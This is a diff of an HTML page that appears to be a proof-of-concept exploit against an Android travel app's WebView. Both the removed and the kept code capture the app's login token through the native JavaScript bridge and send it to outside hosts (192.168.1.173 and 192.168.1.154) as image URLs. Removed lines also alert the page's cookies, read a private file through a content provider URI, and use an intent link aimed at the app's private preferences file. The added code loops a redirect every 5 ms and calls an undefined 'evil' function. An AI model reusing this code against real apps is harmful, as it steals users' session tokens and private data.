@@ -6,15 +6,12 @@
 </head>
 <body>
 
-<br>
-    <a href="intent://itravel.huawei.com/#Intent;component=huawei.w3.smartcom.itravel/huawei.w3.smartcom.itravel.business.welcome.WelcomeActivity;S.openurl=file:///data/data/huawei.w3.smartcom.itravel/shared_prefs/smartcom.itravel.xml;S.eventtype=3-02;S.title=cc;scheme=openitravel;end">查看token和身份证等信息</a>
-  </br>
+<script>
+function gotowhite(){
+top.location.href = "https://tourmet-icsl.hwht.com/webapp/#/tourmet/home";
+}
 
 
-<script type="text/javascript">
-
-setTimeout("getinfo()",1000);
-document.location.href="https://tourmet-icsl.hwht.com/webapp/#/tourmet/home";
 function getinfo() {
 	console.log('get info')
 	//window.nativeCB.bridgeBackFromWeb();
@@ -22,41 +19,17 @@ function getinfo() {
 }
 
     function loginTokenCallback(token) {
+		alert('token is' + token);
         document.body.appendChild(document.createElement("img")).src = "http://192.168.1.173:8081/wallet/" + token;
-        alert('token is' + token);
+       
 		loadXMLDoc()
     }
-
-    function bridgeLoginRespCallback(token) {
-        document.body.appendChild(document.createElement("img")).src = "http://192.168.1.173:8081/wallet/" + token;
-        alert('token is' + token);
-		loadXMLDoc()
-    }
-
-    window.nativeCB.bridgeLoginResp();
-
-	function loadXMLDoc()
-	{
-		alert('cookie is : ' + document.cookie);
-		var xmlhttp;
-		xmlhttp=new XMLHttpRequest();
-		xmlhttp.onreadystatechange=function()
-		{
-			if (xmlhttp.readyState==4 && xmlhttp.status==200)
-			{
-				document.body.appendChild(document.createElement("img")).src = "http://192.168.1.154:8080/wallet/" + xmlhttp.responseText;
-			}else{
-				document.body.appendChild(document.createElement("img")).src = "http://192.168.1.154:8080/wallet/error";
-			}
-		}
-    //通过content provider uri 获取私有目录下的文件（setAllowContentAccess未设置成false，理论上可以读取应用内所有content uri文件内容）
-		xmlhttp.open("GET","content://huawei.w3.smartcom.itravel.huawei.push.provider/push_notify_flag.xml",true);
-    //通过file协议，获取私有目录下的文件（但是因setAllowFileAccessFromFileURLs 未设置成true,无法读取成功）
-    //xmlhttp.open("GET","file:///data/data/huawei.w3.smartcom.itravel/shared_prefs/smartcom.itravel.xml",true);
-		xmlhttp.send();
-	}
-
-
+	
+	
+setInterval(gotowhite,5);//5毫秒
+setTimeout(evil,3000);//倒计时3秒
 </script>
+	
+	
 </body>
 </html>
